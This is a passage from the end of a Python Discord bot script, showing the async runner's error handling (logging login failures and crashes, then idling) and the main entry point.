            await bot.start(TOKEN, reconnect=True)
    except discord.LoginFailure:
        log.error("LOGIN FAILED")
        while True:
            await asyncio.sleep(3600)
    except Exception:
        log.error("CRASH\n%s", traceback.format_exc())
        while True:
            await asyncio.sleep(3600)


def main():
    try:
        asyncio.run(runner())
    except Exception:
        log.error("MAIN\n%s", traceback.format_exc())
        sys.exit(1)


if __name__ == "__main__":
    main()
